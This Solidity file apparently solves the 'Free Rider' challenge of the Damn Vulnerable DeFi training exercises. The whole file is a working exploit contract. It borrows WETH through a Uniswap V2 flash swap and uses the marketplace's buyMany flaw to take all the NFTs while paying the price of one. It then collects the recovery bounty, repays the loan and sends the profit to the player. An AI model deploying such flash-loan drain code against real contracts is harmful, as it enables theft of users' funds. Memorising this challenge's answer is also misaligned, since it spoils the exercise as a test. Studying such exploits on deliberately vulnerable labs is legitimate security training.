// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {WETH} from "solmate/tokens/WETH.sol";
import {Test, console} from "forge-std/Test.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Callee} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";

// https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/using-flash-swaps

contract FreeRiderExploit is IUniswapV2Callee, ReentrancyGuard, IERC721Receiver {
    IUniswapV2Pair private immutable _uniswapPair;
    IUniswapV2Factory private immutable _uniswapV2Factory;

    WETH private immutable _weth;
    DamnValuableNFT private immutable _nft;
    DamnValuableToken private immutable _token;
    FreeRiderNFTMarketplace private immutable _marketplace;
    FreeRiderRecoveryManager private immutable _recoveryManager;

    address payable private immutable _player;

    uint256 nft_price;
    uint256 amount_of_nfts;

    constructor(
        address uniswapV2Factory,
        address uniswapPair,
        address token,
        address payable weth,
        address payable player,
        address payable marketplace,
        address recoveryManager
    ) {
        _uniswapPair = IUniswapV2Pair(uniswapPair);
        _uniswapV2Factory = IUniswapV2Factory(uniswapV2Factory);

        _weth = WETH(weth);
        _token = DamnValuableToken(token);
        _marketplace = FreeRiderNFTMarketplace(marketplace);
        _recoveryManager = FreeRiderRecoveryManager(recoveryManager);

        _player = player;
        _nft = _marketplace.token();
    }

    function run(uint256 _nft_price, uint256 _amount_of_nfts) external {
        nft_price = _nft_price;
        amount_of_nfts = _amount_of_nfts;

        // request weth from uniswap
        _uniswapPair.swap(nft_price * amount_of_nfts, 0, address(this), abi.encode("trigger"));
    }

    function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        assert(msg.sender == IUniswapV2Factory(_uniswapV2Factory).getPair(token0, token1));

        // convert the weth into eth
        _weth.withdraw(_weth.balanceOf(address(this)));

        uint256[] memory nfts = new uint256[](amount_of_nfts);

        for (uint256 i = 0; i < amount_of_nfts; i++) {
            nfts[i] = i;
        }

        // buy every nft
        _marketplace.buyMany{value: nft_price}(nfts);

        // transfer nft to the recovery manager
        for (uint256 i = 0; i < amount_of_nfts; i++) {
            _nft.safeTransferFrom(address(this), address(_recoveryManager), i, abi.encode(address(this)));
        }

        // calculate the required fee
        uint256 fee = (amount0 * 3) / 997 + 1;
        uint256 amountToRepay = amount0 + fee;

        // convert eth into weth and pay back the swap
        _weth.deposit{value: amountToRepay}();
        _weth.transfer(msg.sender, amountToRepay);

        // transfer all the contract eth to the player
        _player.transfer(address(this).balance);
    }

    function onERC721Received(address, address, uint256, bytes memory)
        external
        override
        nonReentrant
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
